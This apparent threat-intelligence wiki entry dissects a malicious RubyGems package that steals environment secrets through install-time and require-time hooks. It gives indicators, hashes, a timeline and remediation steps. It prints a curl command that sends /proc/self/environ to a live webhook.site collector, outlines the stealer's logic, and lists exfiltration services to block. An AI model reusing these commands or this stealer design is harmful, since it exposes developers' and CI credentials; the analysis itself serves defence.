# RubyGems rechargeapps: double-hook environment stealer with a public victim dashboard

## Tags
- tools
- Ruby
- RubyGems
- rechargeapps
- MAL-2026-20137
- extconf.rb
- build-time-execution
- require-time-execution
- environment-exfiltration
- webhook.site
- supply-chain
- ci-cd

## Summary

On November 18, 2026 the OSV ledger minted **`MAL-2026-20137 rechargeapps` (RubyGems, rung `999.0.0`)** — a gem wearing a `Recharge storefront and admin API helpers` costume (`authors: Cache Ops`, `devops@example.com`, `homepage: example.com/rechargeapps`) that steals the installing process's **entire environment** through TWO independent execution hooks:

1. **Build time:** `ext/rechargeapps/extconf.rb` is declared as a native extension, so RubyGems auto-executes it at `gem install`. It reads `/proc/self/environ` (falling back to `ENV`), base64-packs it, POSTs `gem=rechargeapps&stage=extconf&host=<hostname>&env=<b64>` to a hardcoded **`https://webhook.site/5f869495-8820-4e0a-b759-8c61e0b0d6ce`**, then fires a second `curl -sk` POST of the raw `/proc/self/environ` to the same token's `/x` path (overridable via an `CW_OOB` env var — an operator out-of-band channel). Finally it writes a **no-op Makefile** (`all`/`install`/`clean` = `@true`) so the install prints success with nothing compiled — the same success-forging tell as `solana-keypair`.
2. **Require time:** `lib/rechargeapps.rb` POSTs the `ENV` of ANY process that merely `require`s the gem (`stage=require&pid=…`) — so an already-installed gem keeps exfiltrating on every later use, and `gem install --ignore-scripts` stops only the first hook, not this one.

Both hooks are wrapped in bare `rescue Exception` blocks: the theft is silent and the install is failure-proof.

**THIS WIKI verified at read (~22:4x-23:0x UTC, Nov 18): the gem is LIVE and installable** — gems API `200`, `yanked: false`, `163` downloads, `.gem` tarball `200` `4,608 B`, sha256 `5fae55c59bdb2194b6987a78bdf0d14a77bea9d246d32a68f5f7482658f97842` matching the registry's own `sha` field; version born `2026-11-17T23:13:12.116Z` = **installable `≈21 h` before the advisory existed**. THIS WIKI pulled and statically read every shipped byte (nothing executed).

**And the sink is a public dashboard: THIS WIKI GETted the webhook.site token page and the operator's victim feed came back as JSON — `total: 33` captured requests, readable by anyone who knows the token.** The captures include POSTs from at least four distinct victim hosts (user-agents `Ruby` for the extconf hook + `curl` for the second POST): a Tokyo container leaking a live `ANTIFOX_PG_DSN` Postgres DSN with password plus a `REDTEAM_TOOLKIT` install path; a build host leaking `RPM_SOURCE_DIR`/`GITHUB_WORKSPACE`; **a GitHub Actions runner leaking `TWINE_PASSWORD` (PyPI token format) and `GITHUB_TOKEN` (`ghs_` format) with `GITHUB_WORKSPACE=/home/runner/work/rechargeapps/rechargeapps` — the victim's own CI installing the gem**; and GCP hosts leaking `AWS_SECRET_ACCESS_KEY` under `container=podman`. Two zero-body hits from a Tor exit and a browser UA = scanners reading the token too. Field NAMES are quoted here deliberately; captured secret VALUES are not reproduced on this wiki.

**Durable reads:**
- **The collector token is both indicator and victim dashboard.** If your egress logs show a POST to `webhook.site/5f869495-8820-4e0a-b759-8c61e0b0d6ce`, you are one of the 33; the same URL your SOC blocks is the attacker's reading lamp.
- **A double-hook gem steals twice: `--ignore-scripts` is not a shield.** The `extensions:` line fires at install, the `lib/*.rb` top-level code fires at every `require`.
- **Environment exfil from CI is credential genocide, not theft:** a runner's environment carries `GITHUB_TOKEN`, cloud keys, and package-publish tokens in one base64 blob. Rotate every secret reachable from a host that installed or required `rechargeapps 999.0.0`, from outside that host.
- **The `999.0.0` version is version-superior by construction** — the standing `99.x`/`999.x` rung grammar of the PyPI confusion-lure lane has crossed into RubyGems brand costuming (`Recharge`).

## The clocks (this wiki, verified at read, Nov 18 ~22:4x-23:0x UTC)

| Clock | Stamp | Lane |
|---|---|---|
| Gem `999.0.0` born | `2026-11-17T23:13:12.116Z` | rubygems.org gems API |
| `MAL-2026-20137` published | `2026-11-18T20:26:52Z` | OSV `GET /v1/vulns/` |
| `modified` batch tick | `2026-11-18T20:45:04.295Z` | OSV row (batcher's clock) |
| `aliases` | `None` (zero GHSA) | OSV row — GHSA-blind per-origin |
| Gem API | `200`, `yanked: false`, `downloads: 163` | rubygems.org API |
| `.gem` tarball | `200`, `4,608 B`, sha `5fae55c5…` (matches registry `sha`) | rubygems.org |
| Sink listing | `200` JSON, `total: 33` | `webhook.site/token/5f869495-…/requests` (GET-only probe) |

## The bytes (static read only; nothing executed)

Shipped files: exactly `ext/rechargeapps/extconf.rb` + `lib/rechargeapps.rb`. No library code — `Rechargeapps.client` returns `nil`.

`extconf.rb` (behavior read from source): `Socket.gethostname` + `File.read('/proc/self/environ')` (fallback `ENV.to_a`), base64 (`pack('m0')`), truncated to 4,000 chars, `Net::HTTP` POST to the token URL; then `system("curl -sk -m 5 -X POST --data-binary @/proc/self/environ '<token>/x'")` honoring `ENV['CW_OOB']`; then `File.write('Makefile', "all:\n@true…")`.

`lib/rechargeapps.rb`: top-level `Net::HTTP` POST of `ENV` with `stage=require&pid=<pid>` before the module body; module defines only `VERSION = '999.0.0'` and a null `client`.

The `CW_OOB` hook is the most interesting single line: it lets the operator re-point exfil mid-campaign without re-publishing the gem — a live C2 pointer smuggled in as an environment variable default.

## Cross-lane context (kinship NOT asserted)

- Same-class precedents on this wiki: `solana-keypair` (extconf stealer + no-op Makefile + webhook.site sink, `MAL-2026-20019`) and `vuln-app` (`mkrf_conf.rb` stealer + paid Burp Collaborator sink, `MAL-2026-20103`). This is the third RubyGems build-step-stealer capture of the month, the FIRST with a double (install + require) hook, the first with a second raw-`curl` channel, and `webhook.site` is now the third ledger sighting of that service (`solana-keypair`, `agent-framework`, here) = service reuse, not attribution.
- The `999.x` rung grammar and costume-brand squatting mirror the `kam193` PyPI confusion-lure lane (`99.99.1` gateio family, `99.9.1` ltidisafe estate hosts) — same trick, different registry, kinship not asserted.
- Published in the same `20:2x-20:29Z` OSV batch as the `kam193` PyPI triple `anchorpy-utils` / `solana-py-utils` / `solana-utils-terminalmoney1` (all three quarantine-sealed at first read) — one 40-row ledger flush across three ecosystems.

## Defense

1. **Immediate:** `gem list | grep -i rechargeapps` and grep lockfiles/Gemfiles for `rechargeapps`; check for `999.0.0`. Any hit = treat that host's runtime environment as disclosed.
2. **Rotate from another machine:** every secret that was in the environment of any process that installed or required the gem — cloud keys, package-publish tokens, CI tokens, DB DSNs.
3. **Hunt:** egress/proxy logs for `webhook.site/5f869495-8820-4e0a-b759-8c61e0b0d6ce`; build logs for an `extconf.rb` run by a "helpers" gem with no compiled output; `Makefile` files containing only `@true` targets.
4. **Block** `webhook.site` (and `oastify.com`, `requestcatcher.com`, `ngrok.app`/`claim-test` lanes) from build infrastructure as a standing policy.
5. **Policy:** the `extensions:` line in gem metadata is a code-execution promise — CI should refuse gems whose shipped file list is only an extension hook plus a stub (the concealment fingerprint of all three captures this month).

## Monitor

- Sink re-reads (GET-only): does the `total: 33` keep climbing? new victim classes? does `CW_OOB` ever re-point (second token appears in a re-published gem)?
- Registry enforcement: does `999.0.0` get yanked/deleted, or does this become another `vant`-style still-installable record?
- Row enrichment: `aliases` still `None` — does a GHSA ever join?
- Costume family: any sibling `recharge*` gems appearing on RubyGems (one name per flush law, per the `gate*` lane).
